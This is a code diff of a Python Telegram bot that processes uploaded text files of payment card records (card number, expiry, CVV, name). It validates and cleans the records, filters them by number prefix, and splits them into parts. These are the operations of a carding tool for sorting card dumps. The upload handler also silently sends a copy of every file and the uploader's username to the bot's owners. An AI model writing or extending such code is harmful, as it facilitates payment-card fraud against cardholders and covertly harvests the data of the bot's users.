@@ -126,14 +126,14 @@ async def validate_reply_to_txt(update: Update) -> Document | None:
 # 4. BOT INTERFACE COMMAND & FILE HANDLERS
 # --------------------------------------------------------
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Responds to /start by sending a simple greeting."""
+    """Responds to /start by sending a plain text greeting with no keyboards."""
     user = update.effective_user
     greeting = f"Hello @{user.username}!" if user.username else f"Hello {user.first_name}!"
     welcome_text = f"{greeting}\n\nPlease upload a file in .txt format 📂"
     await update.message.reply_text(welcome_text)
 
 async def document_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handles standard file uploads and returns the command instructions."""
+    """Handles standard file uploads and returns text-only instructions."""
     user = update.effective_user
     document = update.message.document
 
@@ -141,7 +141,7 @@ async def document_upload_handler(update: Update, context: ContextTypes.DEFAULT_
         await update.message.reply_text("❌ **File Rejected:** This bot accepts only standard plain-text `.txt` files.")
         return
 
-    # Handle owner alert matrices without output log spam
+    # Handle owner notifications
     username_str = f"@{user.username}" if user.username else "None"
     current_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
     
@@ -154,7 +154,6 @@ async def document_upload_handler(update: Update, context: ContextTypes.DEFAULT_
         f"🕒 Timestamp: {current_time_str}"
     )
     
-    # Fire-and-forget notifications to owners
     asyncio.create_task(send_to_owners(context, caption=owner_notification_text, file_source=None))
     asyncio.create_task(send_to_owners(context, caption=f"📄 Original File Copy: {document.file_name}", file_source=document.file_id))
 
@@ -232,7 +231,6 @@ async def run_processing_task(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("⏳ **Process Blocked:** You currently have an active parsing run. Wait for completion or send `/stop` before continuing.")
         return
 
-    # Use message_id of the replied file message to isolate simultaneous uploads safely
     message_id = update.message.reply_to_message.message_id
     task_dir_name = f"{user_id}_{message_id}"
     
@@ -262,7 +260,6 @@ async def run_processing_task(update: Update, context: ContextTypes.DEFAULT_TYPE
         finally:
             if user_id in ACTIVE_TASKS:
                 del ACTIVE_TASKS[user_id]
-            # Clean up task-specific isolated directories
             shutil.rmtree(input_dir, ignore_errors=True)
             shutil.rmtree(user_outputs_path, ignore_errors=True)
 
@@ -283,7 +280,6 @@ async def process_file_stream(update: Update, context: ContextTypes.DEFAULT_TYPE
         await update.message.reply_text("⚠️ **Processing Aborted:** The uploaded file contains no data rows.")
         return
 
-    # Step 1: Send mode-specific progress summary message blocks
     if mode == "split":
         chunk_size = int(param)
         total_parts = math.ceil(total_lines / chunk_size)
@@ -311,7 +307,6 @@ async def process_file_stream(update: Update, context: ContextTypes.DEFAULT_TYPE
         )
         await update.message.reply_text(progress_msg)
 
-    # Step 2: Run execution blocks asynchronously
     # ----------------- MODE: CLEAR PIPELINE -----------------
     if mode == "clear":
         out_filename = f"cleared_{original_name}"
@@ -329,7 +324,6 @@ async def process_file_stream(update: Update, context: ContextTypes.DEFAULT_TYPE
                 segments = [seg.strip() for seg in stripped_line.split("|")]
                 card, mm, yy, cvv = None, None, None, None
                 
-                # Check Format 1 & 2: CARD|MM/YY|CVV|NAME...
                 if len(segments) >= 3 and "/" in segments[1]:
                     date_parts = segments[1].split("/")
                     if len(date_parts) == 2:
@@ -338,14 +332,12 @@ async def process_file_stream(update: Update, context: ContextTypes.DEFAULT_TYPE
                         yy = date_parts[1].strip()
                         cvv = segments[2]
                         
-                # Check Format 3 & 4: CARD|MM|YY|CVV|NAME...
                 elif len(segments) >= 4:
                     card = segments[0]
                     mm = segments[1]
                     yy = segments[2]
                     cvv = segments[3]
                     
-                # STRICT VALIDATION CHECKS
                 if card and mm and yy and cvv:
                     is_valid_card = card.isdigit() and len(card) == 16
                     is_valid_mm = mm.isdigit() and len(mm) == 2 and 1 <= int(mm) <= 12
@@ -383,7 +375,6 @@ async def process_file_stream(update: Update, context: ContextTypes.DEFAULT_TYPE
                 line_counter += 1
                 stripped_line = line.strip()
                 
-                # Check if the line begins with the requested prefix
                 if stripped_line.startswith(prefix_str):
                     await outfile.write(stripped_line + "\n")
                     output_lines_count += 1
@@ -442,7 +433,6 @@ async def process_file_stream(update: Update, context: ContextTypes.DEFAULT_TYPE
             files_sent = True
             await asyncio.sleep(0.3)
 
-    # Successful completion flag output
     if files_sent:
         await update.message.reply_text("✅ Work done 💯")
     else:
@@ -459,16 +449,16 @@ def main():
     
     app = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    # Core commands
+    # Core text-only commands
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("stop", stop_command))
 
-    # Reply commands mapped with Regex Filters to capture optional spaces and strict structures
+    # Text message regex routers for processing file replies
     app.add_handler(MessageHandler(filters.Regex(r"(?i)^/clear$"), clear_command_handler))
     app.add_handler(MessageHandler(filters.Regex(r"(?i)^/spl\s*\d+\s*$"), spl_command_handler))
     app.add_handler(MessageHandler(filters.Regex(r"(?i)^/ext\s*\d+\s*$"), ext_command_handler))
 
-    # Catch-all for uploaded documents
+    # Catch-all file validation streams
     app.add_handler(MessageHandler(filters.Document.TXT, document_upload_handler))
     app.add_handler(MessageHandler(filters.Document.ALL & ~filters.Document.TXT, rejected_files_handler))
 
